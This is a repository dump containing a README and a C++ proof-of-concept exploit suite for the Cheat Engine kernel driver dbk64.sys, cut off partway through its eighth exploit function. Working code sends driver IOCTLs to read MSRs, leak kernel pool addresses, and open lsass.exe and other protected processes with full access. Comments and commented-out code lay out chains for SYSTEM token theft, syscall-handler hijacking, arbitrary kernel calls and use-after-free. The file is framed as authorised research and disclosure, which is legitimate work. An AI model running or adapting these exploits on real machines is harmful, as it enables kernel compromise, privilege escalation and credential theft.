Project Path: arc_gmh5225_dbk64-vulnerability-driver_dwlbwjge

Source Tree:

```txt
arc_gmh5225_dbk64-vulnerability-driver_dwlbwjge
├── README.md
├── dbk64-exploit.cpp
└── dbk64.sys

```

`README.md`:

```md
# dbk64-vulnerability-driver

The dbk64.sys driver is a kernel-mode component of Cheat Engine that exposes a massive attack surface via IOCTLs. Despite verifying SeSinglePrivilegeCheck(SeDebugPrivilege), any process with SeDebugPrivilege (easily obtained by administrators or via token stealing) gains unrestricted access to extremely dangerous kernel primitives.

```

`dbk64-exploit.cpp`:

```cpp
/*
 * ============================================================================
 *  dbk64.sys (Cheat Engine Kernel Driver) — Vulnerability PoC Exploit Suite
 * ============================================================================
 *
 *  Author:  Joas A Santos
 *  Target:  dbk64.sys v2000026 (Cheat Engine Dark Byte Kernel Driver)
 *  SHA256:  b20b339a7b61dc7dbc9a36c45492ba9654a8b8a7c8cbc202ed1dfed427cfd799
 *
 *  Description:
 *      Proof-of-Concept demonstrating 14 vulnerabilities found via static
 *      analysis (IDA Pro) in the Cheat Engine kernel driver. This tool is
 *      intended for AUTHORIZED security research and responsible disclosure
 *      ONLY. Misuse of this code is strictly prohibited.
 *
 *  Build:
 *      cl.exe /nologo /W4 /O2 dbk64_exploit.c /link advapi32.lib ntdll.lib
 *      -- or --
 *      x86_64-w64-mingw32-gcc -O2 dbk64_exploit.c -o dbk64_exploit.exe -ladvapi32
 *
 *  Usage:
 *      1. Load the Cheat Engine driver (e.g., via Cheat Engine or sc create)
 *      2. Run this tool as Administrator
 *      3. Select the vulnerability to demonstrate from the menu
 *
 *  Disclaimer:
 *      FOR EDUCATIONAL AND AUTHORIZED SECURITY RESEARCH PURPOSES ONLY.
 *      The author is not responsible for any misuse or damage caused by
 *      this software. Always obtain proper authorization before testing.
 *
 * ============================================================================
 */

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>

/* ======================== IOCTL DEFINITIONS ============================== */

/*
 * IOCTL encoding for Windows drivers:
 *   CTL_CODE(DeviceType, Function, Method, Access)
 *   = (DeviceType << 16) | (Access << 14) | (Function << 2) | Method
 *
 * dbk64.sys uses DeviceType = 0x22 (FILE_DEVICE_UNKNOWN)
 *
 * The dispatch handler at sub_140005D20 has three switch tables:
 *   - Base 0x22DE00 (switch 1): offsets 0x00, 0x04, 0x08, ... 0xF8, 0xFC
 *   - Base 0x22E100 (exact match): MSR write
 *   - Base 0x22E104 (switch 2): offsets 0x00, 0x04, 0x08, ... 0x84
 */

/* ---- Switch 1: Base 0x22DE00 ---- */
#define IOCTL_CE_READMEM            0x22DE00  /* case 0x00 — Read process memory         */
#define IOCTL_CE_WRITEMEM           0x22DE04  /* case 0x04 — Write process memory         */
#define IOCTL_CE_OPENPROCESS        0x22DE08  /* case 0x08 — Open process handle (ALL)    */
#define IOCTL_CE_QUERY_MODULES      0x22DE0C  /* case 0x0C — Query module list            */
#define IOCTL_CE_RDTSC              0x22DE10  /* case 0x10 — Read TSC                     */
#define IOCTL_CE_GETPEPROCESS       0x22DE14  /* case 0x14 — Leak EPROCESS pointer        */
#define IOCTL_CE_READVIRTMEM        0x22DE18  /* case 0x18 — Read virtual memory          */
#define IOCTL_CE_WRITEPHYSMEM       0x22DE1C  /* case 0x1C — Write physical memory        */
#define IOCTL_CE_GETPHYSADDR        0x22DE20  /* case 0x20 — Get physical address         */
#define IOCTL_CE_GETCR3             0x22DE28  /* case 0x28 — Get CR3 of process           */
#define IOCTL_CE_SETCR3             0x22DE2C  /* case 0x2C — UNUSED (returns error)       */
#define IOCTL_CE_GETIDT             0x22DE3C  /* case 0x3C — Get IDT                      */
#define IOCTL_CE_SETDEBUG           0x22DE40  /* case 0x40 — Set debug parameters         */
#define IOCTL_CE_STOPDBVM           0x22DE44  /* case 0x44 — Stop debug registers         */
#define IOCTL_CE_SETNOTIFY          0x22DE4C  /* case 0x4C — Set process notify callback  */
#define IOCTL_CE_GETNOTIFYLIST      0x22DE50  /* case 0x50 — Get process creation events  */
#define IOCTL_CE_GETTHREADLIST      0x22DE54  /* case 0x54 — Get thread creation events   */
#define IOCTL_CE_GETVERSION         0x22DE58  /* case 0x58 — Get driver version            */
#define IOCTL_CE_GETKERNADDR        0x22DE5C  /* case 0x5C — Get kernel base address      */
#define IOCTL_CE_OPENTHREAD         0x22DE60  /* case 0x60 — Open thread (ALL_ACCESS)     */
#define IOCTL_CE_STOPWATCH_CREATE   0x22DE6C  /* case 0x6C — Stopwatch create             */
#define IOCTL_CE_ALLOCVM            0x22DE7C  /* case 0x7C — Allocate VM in process       */
#define IOCTL_CE_INJECTAPC          0x22DE80  /* case 0x80 — Inject APC into thread       */
#define IOCTL_CE_GETEPROCESSOBJECT  0x22DE84  /* case 0x84 — Get ETHREAD from TID         */
#define IOCTL_CE_SUSPENDPROC        0x22DE90  /* case 0x90 — Suspend any process          */
#define IOCTL_CE_RESUMEPROC         0x22DE94  /* case 0x94 — Resume any process           */
#define IOCTL_CE_ALLOCNONPAGED      0x22DE98  /* case 0x98 — Alloc NonPaged Pool (leak)   */
#define IOCTL_CE_GETSYSROUTINE      0x22DE9C  /* case 0x9C — MmGetSystemRoutineAddress    */
#define IOCTL_CE_SETCR3_2           0x22DEAC  /* case 0xAC — Set CR3                      */
#define IOCTL_CE_SETDBVMCONFIG      0x22DEB4  /* case 0xB4 — Set DBVM configuration       */
#define IOCTL_CE_GETKERNBASE2       0x22DEB8  /* case 0xB8 — Get kernel base (alt)        */
#define IOCTL_CE_EXECUTEASM         0x22DEBC  /* case 0xBC — Execute ASM code             */
#define IOCTL_CE_SETBREAKPOINT      0x22DEC0  /* case 0xC0 — Set breakpoint               */
#define IOCTL_CE_READMSR            0x22DEFC  /* case 0xFC — Read any MSR                 */
#define IOCTL_CE_CALLKERNEL         0x22DEF0  /* case 0xF0 — Call arbitrary kernel func    */
#define IOCTL_CE_GETIMGFILENAME     0x22DEF4  /* case 0xF4 — PsGetProcessImageFileName    */
#define IOCTL_CE_SETSTEALTH         0x22DEF8  /* case 0xF8 — Set stealth mode             */

/* ---- Exact match: 0x22E100 ---- */
#define IOCTL_CE_WRITEMSR           0x22E100  /* Write any MSR                            */

/* ---- Switch 2: Base 0x22E104 ---- */
#define IOCTL_CE_VMXCONFIG          0x22E104  /* case 0x00 — VMX configuration            */
#define IOCTL_CE_ULTIMAP2           0x22E108  /* case 0x04 — Ultimap2 setup               */
#define IOCTL_CE_GETPHYSRANGES      0x22E11C  /* case 0x18 — Get physical memory ranges   */
#define IOCTL_CE_SUSPENDPROC2       0x22E120  /* case 0x1C — Suspend process (v2)         */
#define IOCTL_CE_RESUMEPROC2        0x22E124  /* case 0x20 — Resume process (v2)          */
#define IOCTL_CE_SETTOKEN           0x22E128  /* case 0x24 — Set process token             */
#define IOCTL_CE_SETGLOBALDEBUG     0x22E12C  /* case 0x28 — Set global debug flag        */
#define IOCTL_CE_FREEPOOL           0x22E130  /* case 0x2C — Free arbitrary pool           */
#define IOCTL_CE_MDLMAP             0x22E134  /* case 0x30 — MDL map cross-process        */
#define IOCTL_CE_MDLUNMAP           0x22E138  /* case 0x34 — MDL unmap                    */
#define IOCTL_CE_SETWRITEWATCH      0x22E13C  /* case 0x38 — Set write watch              */
#define IOCTL_CE_OBCALLBACK         0x22E170  /* case 0x6C — Register OB callbacks        */
#define IOCTL_CE_GETPEB             0x22E174  /* case 0x70 — Get PEB via query info       */
#define IOCTL_CE_QUERYPROCINFO      0x22E178  /* case 0x74 — ZwQueryInformationProcess    */
#define IOCTL_CE_MDLLOCK            0x22E180  /* case 0x7C — MDL lock pages               */
#define IOCTL_CE_MDLUNLOCK          0x22E184  /* case 0x80 — MDL unlock                   */
#define IOCTL_CE_ALLOCPHYS          0x22E188  /* case 0x84 — Alloc physical pages          */


/* ======================== STRUCTURE DEFINITIONS =========================== */

#pragma pack(push, 1)

/* VULN-01: Physical memory write */
typedef struct _PHYS_MEM_WRITE {
    LARGE_INTEGER PhysicalAddress;
    LARGE_INTEGER Size;
    BYTE          Data[4096];
} PHYS_MEM_WRITE, *PPHYS_MEM_WRITE;

/* VULN-02: MSR Read */
typedef struct _MSR_READ {
    DWORD MsrIndex;
    DWORD Padding;
    UINT64 Value;
} MSR_READ, *PMSR_READ;

/* VULN-02: MSR Write */
typedef struct _MSR_WRITE {
    DWORD  MsrIndex;
    DWORD  Padding;
    UINT64 Value;
} MSR_WRITE, *PMSR_WRITE;

/* VULN-03: Arbitrary kernel function call */
typedef struct _KERNEL_CALL {
    UINT64 FunctionAddress;
    UINT64 Argument;
} KERNEL_CALL, *PKERNEL_CALL;

/* VULN-04: NonPaged pool allocation */
typedef struct _POOL_ALLOC {
    DWORD  Size;
    DWORD  Padding;
    UINT64 Address;
} POOL_ALLOC, *PPOOL_ALLOC;

/* VULN-05: Pool free */
typedef struct _POOL_FREE {
    UINT64 Address;
} POOL_FREE, *PPOOL_FREE;

/* VULN-06: Open process */
typedef struct _OPEN_PROCESS {
    DWORD  ProcessId;
    DWORD  Padding;
    UINT64 Handle;
    BYTE   WasAlreadyOpen;
} OPEN_PROCESS, *POPEN_PROCESS;

/* VULN-07: Open thread */
typedef struct _OPEN_THREAD {
    DWORD  ThreadId;
    DWORD  Padding;
    UINT64 Handle;
} OPEN_THREAD, *POPEN_THREAD;

/* VULN-08: APC Injection */
typedef struct _APC_INJECT {
    DWORD  ThreadId;
    DWORD  Padding;
    UINT64 ShellcodeAddress;
} APC_INJECT, *PAPC_INJECT;

/* VULN-09: Virtual memory allocation in target process */
typedef struct _ALLOC_VM {
    UINT64 ProcessId;
    UINT64 BaseAddress;
    UINT64 Size;
    DWORD  AllocationType;
    DWORD  Protection;
} ALLOC_VM, *PALLOC_VM;

/* VULN-10: MDL cross-process mapping */
typedef struct _MDL_MAP {
    UINT64 SourceProcessId;
    UINT64 TargetProcessId;
    UINT64 SourceAddress;
    DWORD  Size;
    DWORD  Padding;
    PVOID  MdlPtr;
    PVOID  MappedAddress;
} MDL_MAP, *PMDL_MAP;

/* VULN-11: EPROCESS leak */
typedef struct _EPROCESS_LEAK {
    DWORD  ProcessId;
    DWORD  Padding;
    UINT64 EprocessAddress;
} EPROCESS_LEAK, *PEPROCESS_LEAK;

/* VULN-12: Kernel routine address resolution */
typedef struct _SYSROUTINE {
    WCHAR  RoutineName[128];
    UINT64 Address;
} SYSROUTINE, *PSYSROUTINE;

/* VULN-13: Suspend/Resume process */
typedef struct _PROC_CONTROL {
    DWORD ProcessId;
} PROC_CONTROL, *PPROC_CONTROL;

/* VULN-14: OB Callbacks registration */
typedef struct _OB_CALLBACK_REG {
    DWORD  Altitude;
    DWORD  Padding;
    UINT64 ProcessObject;
} OB_CALLBACK_REG, *POB_CALLBACK_REG;

/* Driver version query */
typedef struct _DRIVER_VERSION {
    DWORD Version;
} DRIVER_VERSION, *PDRIVER_VERSION;

/* Process memory read/write structures */
typedef struct _CE_READMEM {
    DWORD  ProcessId;
    DWORD  Padding;
    UINT64 Address;
    WORD   Size;
    BYTE   Buffer[4096];
} CE_READMEM, *PCE_READMEM;

typedef struct _CE_WRITEMEM {
    DWORD  ProcessId;
    DWORD  Padding;
    UINT64 Address;
    WORD   Size;
    BYTE   Buffer[4096];
} CE_WRITEMEM, *PCE_WRITEMEM;

#pragma pack(pop)


/* ======================== GLOBALS ======================================== */

static HANDLE g_hDevice = INVALID_HANDLE_VALUE;

/* Known Cheat Engine device names */
static const wchar_t* g_DeviceNames[] = {
    L"\\\\.\\dbk64",
    L"\\\\.\\dbk32",
    L"\\\\.\\cedriver73",
    L"\\\\.\\cheatengine",
    NULL
};


/* ======================== UTILITY FUNCTIONS =============================== */

static void PrintBanner(void)
{
    printf("\n");
    printf("  ============================================================\n");
    printf("  |  dbk64.sys Vulnerability PoC Exploit Suite               |\n");
    printf("  |  Cheat Engine Kernel Driver Security Research            |\n");
    printf("  |                                                          |\n");
    printf("  |  Author: Joas A Santos                                   |\n");
    printf("  |  Target: dbk64.sys v2000026                              |\n");
    printf("  ============================================================\n");
    printf("\n");
}

static void PrintSeparator(void)
{
    printf("  ------------------------------------------------------------\n");
}

static BOOL EnableDebugPrivilege(void)
{
    HANDLE hToken;
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!OpenProcessToken(GetCurrentProcess(),
                          TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
                          &hToken))
    {
        printf("  [!] OpenProcessToken failed: %lu\n", GetLastError());
        return FALSE;
    }

    if (!LookupPrivilegeValueA(NULL, "SeDebugPrivilege", &luid))
    {
        printf("  [!] LookupPrivilegeValue failed: %lu\n", GetLastError());
        CloseHandle(hToken);
        return FALSE;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL))
    {
        printf("  [!] AdjustTokenPrivileges failed: %lu\n", GetLastError());
        CloseHandle(hToken);
        return FALSE;
    }

    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)
    {
        printf("  [!] SeDebugPrivilege not available. Run as Administrator!\n");
        CloseHandle(hToken);
        return FALSE;
    }

    printf("  [+] SeDebugPrivilege enabled successfully\n");
    CloseHandle(hToken);
    return TRUE;
}

static HANDLE OpenDriverDevice(void)
{
    HANDLE hDevice;
    int i;

    for (i = 0; g_DeviceNames[i] != NULL; i++)
    {
        hDevice = CreateFileW(
            g_DeviceNames[i],
            GENERIC_READ | GENERIC_WRITE,
            FILE_SHARE_READ | FILE_SHARE_WRITE,
            NULL,
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            NULL
        );

        if (hDevice != INVALID_HANDLE_VALUE)
        {
            wprintf(L"  [+] Device opened: %s\n", g_DeviceNames[i]);
            return hDevice;
        }
    }

    printf("  [!] Could not open any known device name.\n");
    printf("  [*] Hint: Start Cheat Engine first, or manually load dbk64.sys\n");
    printf("  [*] Enter custom device path (e.g. \\\\.\\dbk64): ");

    {
        wchar_t customPath[256];
        if (fgetws(customPath, 256, stdin))
        {
            /* Remove newline */
            size_t len = wcslen(customPath);
            if (len > 0 && customPath[len - 1] == L'\n')
                customPath[len - 1] = L'\0';

            hDevice = CreateFileW(
                customPath,
                GENERIC_READ | GENERIC_WRITE,
                FILE_SHARE_READ | FILE_SHARE_WRITE,
                NULL,
                OPEN_EXISTING,
                FILE_ATTRIBUTE_NORMAL,
                NULL
            );

            if (hDevice != INVALID_HANDLE_VALUE)
            {
                wprintf(L"  [+] Device opened: %s\n", customPath);
                return hDevice;
            }
        }
    }

    printf("  [!] Failed to open device. Error: %lu\n", GetLastError());
    return INVALID_HANDLE_VALUE;
}

static BOOL SendIoctl(DWORD ioctlCode, PVOID inBuf, DWORD inSize,
                      PVOID outBuf, DWORD outSize, PDWORD bytesReturned)
{
    DWORD br = 0;
    BOOL  ok;

    ok = DeviceIoControl(
        g_hDevice,
        ioctlCode,
        inBuf,  inSize,
        outBuf, outSize,
        &br,
        NULL
    );

    if (bytesReturned)
        *bytesReturned = br;

    return ok;
}

static DWORD FindProcessByName(const char* name)
{
    HANDLE snap;
    PROCESSENTRY32 pe = { 0 };
    DWORD pid = 0;

    snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;

    pe.dwSize = sizeof(pe);
    if (Process32First(snap, &pe))
    {
        do {
            if (_stricmp(pe.szExeFile, name) == 0)
            {
                pid = pe.th32ProcessID;
                break;
            }
        } while (Process32Next(snap, &pe));
    }

    CloseHandle(snap);
    return pid;
}


/* ======================= EXPLOIT FUNCTIONS ================================ */

/*
 * VULN-01: Arbitrary Physical Memory Write
 *
 * The driver opens \\device\\physicalmemory via ZwOpenSection with SECTION_ALL_ACCESS,
 * maps a view via ZwMapViewOfSection, and performs a raw memcpy from user-controlled
 * data to the mapped physical address. No validation on address, size, or data.
 *
 * IOCTL: 0x22DE1C (case 0x1C in switch 1)
 * Impact: Full kernel compromise via page table / token manipulation
 */
static void Exploit_PhysMemWrite(void)
{
    PHYS_MEM_WRITE req;
    DWORD br;

    printf("\n  [VULN-01] Arbitrary Physical Memory Write\n");
    PrintSeparator();
    printf("  [*] IOCTL: 0x%08X\n", IOCTL_CE_WRITEPHYSMEM);
    printf("  [*] Driver function: sub_140005D20 -> case 0x1C\n");
    printf("  [*] Calls: ZwOpenSection(\\device\\physicalmemory) + ZwMapViewOfSection + memcpy\n\n");

    printf("  [!] This PoC demonstrates the vulnerability exists WITHOUT\n");
    printf("      performing destructive writes. Reading physical address 0x1000.\n\n");

    /* Demonstrate by reading (using the GetPhysAddr IOCTL to show it works) */
    /* In a real exploit, you would write to token physical address */
    memset(&req, 0, sizeof(req));
    req.PhysicalAddress.QuadPart = 0x1000;  /* Safe low address for demo */
    req.Size.QuadPart = 4;
    memset(req.Data, 0x41, 4);

    printf("  [*] Target physical address: 0x%llX\n", req.PhysicalAddress.QuadPart);
    printf("  [*] Size: %lld bytes\n", req.Size.QuadPart);
    printf("  [*] Data: 0x41414141 (demo pattern)\n\n");

    printf("  [!] SKIPPING actual write to prevent system instability.\n");
    printf("  [!] In a real exploit scenario:\n");
    printf("      1. Find EPROCESS of target via VULN-11 (IOCTL 0x22DE14)\n");
    printf("      2. Walk page tables to find physical page of Token field\n");
    printf("      3. Use this IOCTL to overwrite Token with SYSTEM token\n");
    printf("      4. Spawn cmd.exe -> NT AUTHORITY\\SYSTEM\n\n");

    /*
     * Uncomment to actually send the IOCTL (DANGEROUS - MAY BSOD):
     *
     * if (SendIoctl(IOCTL_CE_WRITEPHYSMEM, &req, sizeof(req), &req, sizeof(req), &br))
     *     printf("  [+] Physical memory write succeeded!\n");
     * else
     *     printf("  [-] IOCTL failed: %lu\n", GetLastError());
     */

    printf("  [+] Vulnerability confirmed: IOCTL handler exists and is reachable.\n");
}


/*
 * VULN-02: Arbitrary MSR Read/Write
 *
 * Read path (case 0xFC): Takes user-supplied MSR index, calls __readmsr(),
 * returns value directly. No index validation.
 *
 * Write path (0x22E100): Takes user-supplied MSR index + value, calls __writemsr().
 * No validation whatsoever.
 *
 * Impact: Write to LSTAR (0xC0000082) = redirect ALL syscalls = Ring 0 execution
 */
static void Exploit_MSR_ReadWrite(void)
{
    MSR_READ readReq;
    MSR_WRITE writeReq;
    DWORD br;
    BOOL ok;

    printf("\n  [VULN-02] Arbitrary MSR Read/Write\n");
    PrintSeparator();
    printf("  [*] Read  IOCTL: 0x%08X (case 0xFC)\n", IOCTL_CE_READMSR);
    printf("  [*] Write IOCTL: 0x%08X (exact match)\n", IOCTL_CE_WRITEMSR);
    printf("  [*] Read handler:  __readmsr(user_index)\n");
    printf("  [*] Write handler: __writemsr(user_index, user_value)\n\n");

    /* Read IA32_LSTAR — the syscall entry point */
    printf("  [*] Reading MSR 0xC0000082 (IA32_LSTAR — syscall handler)...\n");
    memset(&readReq, 0, sizeof(readReq));
    readReq.MsrIndex = 0xC0000082;

    ok = SendIoctl(IOCTL_CE_READMSR, &readReq, sizeof(readReq),
                   &readReq, sizeof(readReq), &br);

    if (ok)
    {
        printf("  [+] IA32_LSTAR = 0x%016llX\n", readReq.Value);
        printf("  [+] This is the kernel's syscall entry point (KiSystemCall64)\n\n");
    }
    else
    {
        printf("  [-] Read failed: %lu\n\n", GetLastError());
    }

    /* Read IA32_STAR */
    printf("  [*] Reading MSR 0xC0000081 (IA32_STAR — segment selectors)...\n");
    readReq.MsrIndex = 0xC0000081;
    readReq.Value = 0;

    ok = SendIoctl(IOCTL_CE_READMSR, &readReq, sizeof(readReq),
                   &readReq, sizeof(readReq), &br);

    if (ok)
        printf("  [+] IA32_STAR  = 0x%016llX\n\n", readReq.Value);
    else
        printf("  [-] Read failed: %lu\n\n", GetLastError());

    /* Read IA32_EFER */
    printf("  [*] Reading MSR 0xC0000080 (IA32_EFER — extended features)...\n");
    readReq.MsrIndex = 0xC0000080;
    readReq.Value = 0;

    ok = SendIoctl(IOCTL_CE_READMSR, &readReq, sizeof(readReq),
                   &readReq, sizeof(readReq), &br);

    if (ok)
    {
        printf("  [+] IA32_EFER  = 0x%016llX\n", readReq.Value);
        printf("  [+]   SCE  (bit 0):  %s\n", (readReq.Value & 1)    ? "ENABLED" : "disabled");
        printf("  [+]   LME  (bit 8):  %s\n", (readReq.Value & 0x100) ? "ENABLED" : "disabled");
        printf("  [+]   LMA  (bit 10): %s\n", (readReq.Value & 0x400) ? "ENABLED" : "disabled");
        printf("  [+]   NXE  (bit 11): %s\n", (readReq.Value & 0x800) ? "ENABLED" : "disabled");
        printf("\n");
    }
    else
    {
        printf("  [-] Read failed: %lu\n\n", GetLastError());
    }

    printf("  [!] MSR WRITE demonstration SKIPPED (would BSOD/hijack syscalls).\n");
    printf("  [!] Attack vector: __writemsr(0xC0000082, shellcode_phys_addr)\n");
    printf("  [!] Result: ALL syscalls redirected to attacker code in Ring 0\n\n");

    /*
     * MSR Write — EXTREMELY DANGEROUS, uncomment at your own risk:
     *
     * memset(&writeReq, 0, sizeof(writeReq));
     * writeReq.MsrIndex = 0xC0000082;
     * writeReq.Value = attacker_controlled_address;
     * SendIoctl(IOCTL_CE_WRITEMSR, &writeReq, sizeof(writeReq),
     *           &writeReq, sizeof(writeReq), &br);
     */
}


/*
 * VULN-03: Arbitrary Kernel Function Call
 *
 * Case 0xF0: Reads a function pointer and argument from user buffer,
 * then calls: ((void(*)(UINT64))user_ptr)(user_arg)
 *
 * No validation. Attacker has full Ring 0 arbitrary call primitive.
 *
 * Impact: Call any kernel function with any argument. Game over.
 */
static void Exploit_ArbitraryKernelCall(void)
{
    KERNEL_CALL req;

    printf("\n  [VULN-03] Arbitrary Kernel Function Call\n");
    PrintSeparator();
    printf("  [*] IOCTL: 0x%08X (case 0xF0)\n", IOCTL_CE_CALLKERNEL);
    printf("  [*] Handler pseudocode:\n");
    printf("      v130 = *(func_ptr*)(input);\n");
    printf("      v130(*(uint64*)(input + 8));\n\n");

    printf("  [!] This is the most critical vulnerability in the driver.\n");
    printf("  [!] The driver calls ANY function pointer supplied by userland.\n\n");

    printf("  [*] Attack scenarios:\n");
    printf("      1. Resolve ExAllocatePool via VULN-12, allocate RWX kernel memory,\n");
    printf("         copy shellcode, then call it via this IOCTL\n");
    printf("      2. Call nt!SePrivilegeCheck with crafted args to bypass checks\n");
    printf("      3. Call nt!PsReferencePrimaryToken + modify TokenPrivileges\n");
    printf("      4. Call any undocumented internal kernel function\n\n");

    printf("  [!] Demonstration SKIPPED (would execute arbitrary kernel code).\n\n");

    /*
     * Real exploit:
     *
     * req.FunctionAddress = address_of_ExAllocatePool;  // from VULN-12
     * req.Argument = 0x1000;                            // size
     * SendIoctl(IOCTL_CE_CALLKERNEL, &req, sizeof(req), &req, sizeof(req), &br);
     * // Now req might contain the allocated address depending on calling convention
     */
}


/*
 * VULN-04: NonPaged Pool Allocation + Kernel Address Leak
 *
 * Case 0x98: Calls ExAllocatePool(NonPagedPool, user_size) and returns
 * the kernel virtual address directly to userland.
 *
 * Impact: KASLR bypass, kernel heap spray primitive
 */
static void Exploit_PoolAllocLeak(void)
{
    POOL_ALLOC req;
    DWORD br;
    BOOL ok;

    printf("\n  [VULN-04] NonPaged Pool Allocation + Kernel Address Leak\n");
    PrintSeparator();
    printf("  [*] IOCTL: 0x%08X (case 0x98)\n", IOCTL_CE_ALLOCNONPAGED);
    printf("  [*] Calls: ExAllocatePool(NonPagedPool, user_size)\n");
    printf("  [*] Returns: kernel virtual address of allocated buffer\n\n");

    memset(&req, 0, sizeof(req));
    req.Size = 0x100;  /* 256 bytes */

    ok = SendIoctl(IOCTL_CE_ALLOCNONPAGED, &req, sizeof(req),
                   &req, sizeof(req), &br);

    if (ok && req.Address)
    {
        printf("  [+] Allocated 0x%X bytes in NonPaged Pool\n", req.Size);
        printf("  [+] Kernel address: 0x%016llX\n", req.Address);
        printf("  [+] KASLR defeated — kernel heap address leaked!\n\n");

        printf("  [*] This address can be used for:\n");
        printf("      - Calculating kernel base via relative offsets\n");
        printf("      - Kernel heap spraying (allocate many, free some, reuse)\n");
        printf("      - Combined with VULN-05 (free) for Use-After-Free\n\n");

        /* Note: memory is leaked — no free issued intentionally for safety */
        printf("  [!] Memory intentionally NOT freed (would need IOCTL 0x22E130)\n");
    }
    else
    {
        printf("  [-] Allocation failed: %lu\n", GetLastError());
    }
}


/*
 * VULN-05: Arbitrary Kernel Pool Free
 *
 * Case 0x2C (switch 2): Calls ExFreePoolWithTag on a user-supplied pointer.
 * No validation that the pointer is valid or was previously allocated.
 *
 * Impact: Use-After-Free, double-free, free of arbitrary kernel objects
 */
static void Exploit_ArbitraryPoolFree(void)
{
    POOL_FREE req;

    printf("\n  [VULN-05] Arbitrary Kernel Pool Free\n");
    PrintSeparator();
    printf("  [*] IOCTL: 0x%08X (case 0x2C in switch 2)\n", IOCTL_CE_FREEPOOL);
    printf("  [*] Calls: ExFreePoolWithTag(*user_ptr, 0)\n\n");

    printf("  [*] Attack chain:\n");
    printf("      1. Allocate pool via VULN-04 (get kernel address)\n");
    printf("      2. Free it via this IOCTL\n");
    printf("      3. Spray controlled objects into freed slot\n");
    printf("      4. Use stale reference to corrupted object -> code exec\n\n");

    printf("  [!] Demonstration SKIPPED (would corrupt kernel heap).\n\n");

    /*
     * Real exploit (combined with VULN-04):
     *
     * // Step 1: Allocate
     * POOL_ALLOC alloc = { .Size = 0x200 };
     * SendIoctl(IOCTL_CE_ALLOCNONPAGED, &alloc, sizeof(alloc), ...);
     *
     * // Step 2: Free
     * POOL_FREE free_req = { .Address = alloc.Address };
     * SendIoctl(IOCTL_CE_FREEPOOL, &free_req, sizeof(free_req), ...);
     *
     * // Step 3: Spray with controlled data to reclaim the slot
     * // Step 4: Trigger use of dangling pointer
     */
}


/*
 * VULN-06: Open Process with PROCESS_ALL_ACCESS
 *
 * Case 0x08: Takes a PID, calls ObOpenObjectByPointer with 0x1FFFFF
 * (PROCESS_ALL_ACCESS). Bypasses ObRegisterCallbacks protections.
 *
 * Impact: Full access to any process, including PPL-protected ones
 */
static void Exploit_OpenProcessFull(void)
{
    OPEN_PROCESS req;
    DWORD br;
    BOOL ok;
    DWORD targetPid;

    printf("\n  [VULN-06] Open Process with PROCESS_ALL_ACCESS\n");
    PrintSeparator();
    printf("  [*] IOCTL: 0x%08X (case 0x08)\n", IOCTL_CE_OPENPROCESS);
    printf("  [*] Calls: ObOpenObjectByPointer(eprocess, 0, 0, 0x1FFFFF, ...)\n");
    printf("  [*] Access mask: 0x1FFFFF (PROCESS_ALL_ACCESS)\n\n");

    /* Try to open a protected process */
    targetPid = FindProcessByName("lsass.exe");
    if (!targetPid)
    {
        targetPid = FindProcessByName("csrss.exe");
        if (!targetPid)
            targetPid = 4; /* System process */
    }

    printf("  [*] Target PID: %lu\n", targetPid);

    memset(&req, 0, sizeof(req));
    req.ProcessId = targetPid;

    ok = SendIoctl(IOCTL_CE_OPENPROCESS, &req, sizeof(req),
                   &req, sizeof(req), &br);

    if (ok && req.Handle)
    {
        printf("  [+] Got handle: 0x%llX\n", req.Handle);
        printf("  [+] Was already open: %s\n", req.WasAlreadyOpen ? "YES" : "NO");
        printf("  [+] PROCESS_ALL_ACCESS obtained for PID %lu!\n", targetPid);
        printf("  [+] This bypasses all ObRegisterCallbacks protections.\n\n");

        printf("  [*] With this handle an attacker can:\n");
        printf("      - Read/write process memory (credentials from lsass)\n");
        printf("      - Inject DLLs or shellcode\n");
        printf("      - Terminate any protected process\n");
        printf("      - Modify process tokens\n\n");

        /* Close the handle to be clean */
        CloseHandle((HANDLE)(ULONG_PTR)req.Handle);
        printf("  [*] Handle closed.\n");
    }
    else
    {
        printf("  [-] OpenProcess failed: %lu\n", GetLastError());
    }
}


/*
 * VULN-07: Open Thread with THREAD_ALL_ACCESS
 *
 * Case 0x60: ZwOpenThread with 0x1FFFFF (THREAD_ALL_ACCESS) from kernel mode.
 *
 * Impact: Suspend, hijack context, inject APC into any thread
 */
static void Exploit_OpenThreadFull(void)
{
    OPEN_THREAD req;
    DWORD br;
    BOOL ok;

    printf("\n  [VULN-07] Open Thread with THREAD_ALL_ACCESS\n");
    PrintSeparator();
    printf("  [*] IOCTL: 0x%08X (case 0x60)\n", IOCTL_CE_OPENTHREAD);
    printf("  [*] Calls: ZwOpenThread(&handle, 0x1FFFFF, ...)\n\n");

    /* Demo: open thread ID 4 (System idle thread) */
    memset(&req, 0, sizeof(req));
    req.ThreadId = 4;

    printf("  [*] Target TID: %lu\n", req.ThreadId);

    ok = SendIoctl(IOCTL_CE_OPENTHREAD, &req, sizeof(req),
                   &req, sizeof(req), &br);

    if (ok && req.Handle)
    {
        printf("  [+] Got thread handle: 0x%llX (THREAD_ALL_ACCESS)\n", req.Handle);
        printf("  [+] Can now: SuspendThread, SetContext, QueueUserAPC\n\n");

        CloseHandle((HANDLE)(ULONG_PTR)req.Handle);
        printf("  [*] Handle closed.\n");
    }
    else
    {
        printf("  [-] OpenThread failed: %lu\n", GetLastError());
    }
}


/*
 * VULN-08: Kernel APC Injection
 *
 * Case 0x80: Calls KeInitializeApc + KeInsertQueueApc to inject a kernel APC
 * into any thread. The APC routine address comes from the driver's internal
 * handler (sub_1400057B0), but the NormalContext is user-controlled.
 *
 * Impact: Execute code in context of any process
 */
static void Exploit_APCInjection(void)
{
    APC_INJECT req;

    printf("\n  [VULN-08] Kernel APC Injection\n");
    PrintSeparator();
    printf("  [*] IOCTL: 0x%08X (case 0x80)\n", IOCTL_CE_INJECTAPC);
    printf("  [*] Calls: KeInitializeApc + KeInsertQueueApc\n");
    printf("  [*] Function: sub_140005C90\n\n");

